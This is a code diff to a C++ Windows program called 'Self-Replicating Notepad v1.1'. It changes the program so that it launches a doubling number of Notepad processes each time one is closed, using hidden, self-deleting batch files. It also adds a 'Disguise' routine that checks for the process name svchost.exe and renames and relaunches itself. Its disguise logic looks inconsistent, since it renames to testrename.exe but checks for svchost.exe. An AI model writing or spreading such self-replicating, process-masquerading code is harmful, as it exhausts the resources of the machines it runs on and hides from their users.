@@ -14,12 +14,26 @@ BOOL IsProcessRunning(DWORD pid);
 bool isrunning;
 
 //Duplication
-int amount = 0;
+int amount = 1;
 int firstopen = 0;
+
+//Functions
+std::string GetProcessName();
+void Disguise();
 void RunNew();
+
 
 int WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int cmdShow)
 {
+	std::string currentName = GetProcessName();
+
+	if (currentName != "svchost.exe")
+	{
+		Disguise();
+		Sleep(150);
+		exit(0);
+	}
+
 	while (!GetAsyncKeyState(VK_F12))
 	{
 		while (dwProcID == 0)
@@ -35,7 +49,7 @@ int WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int c
 			if (!hWindow && firstopen < 1)
 			{
 				RunNew();
-				Sleep(250);
+				firstopen++;
 			}
 		}
 
@@ -45,30 +59,25 @@ int WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int c
 
 			if (!isrunning)
 			{
-				if (amount < 1)
-				{
-					amount = 1;
-				}
-				else if (amount >= 1)
-				{
-					amount = amount * 2;
-				}
+				amount = amount * 2;
+				
 				for (int run = 0; run < amount; run++)
 				{
 					if (GetAsyncKeyState(VK_F12))
 					{
-						MessageBoxA(0, "[BG] Self-Replicating Notepad v1", "Credits", MB_ICONINFORMATION);
+						MessageBoxA(0, "[BG] Self-Replicating Notepad v1.1", "Credits", MB_ICONINFORMATION);
 						exit(0);
 					}
 					RunNew();
 				}
-
 				Sleep(500);
 				dwProcID = 0;
 			}
+			else if (isrunning)
+				Sleep(20);
 		}
 	}
-	MessageBoxA(0, "[BG] Self-Replicating Notepad v1", "Credits", MB_ICONINFORMATION);
+	MessageBoxA(0, "[BG] Self-Replicating Notepad v1.1", "Credits", MB_ICONINFORMATION);
 }
 
 BOOL IsProcessRunning(DWORD pid)
@@ -77,6 +86,29 @@ BOOL IsProcessRunning(DWORD pid)
 	DWORD ret = WaitForSingleObject(process, 0);
 	CloseHandle(process);
 	return ret == WAIT_TIMEOUT;
+}
+
+std::string GetProcessName()
+{
+	TCHAR szExeFileName[MAX_PATH];
+	GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+	const std::string path = szExeFileName;
+	auto const pos = path.find_last_of("\\");
+	const auto processname = path.substr(pos + 1);
+
+	return processname;
+}
+
+void Disguise()
+{
+	char batname[MAX] = "disguise.bat";
+	char batcmd[MAX] = "@echo off\nrename self_replicating_notepad.exe testrename.exe\ntestrename.exe\nexit 0";
+	FILE* fp;
+	fp = fopen(batname, "w");
+	fprintf(fp, batcmd);
+	fprintf(fp, "\ndel %s", batname);
+	fclose(fp);
+	ShellExecute(NULL, "open", batname, NULL, NULL, SW_HIDE);
 }
 
 void RunNew()
@@ -94,5 +126,4 @@ void RunNew()
 	fprintf(fp, "\ndel %s", temppath);
 	fclose(fp);
 	ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
-
 }
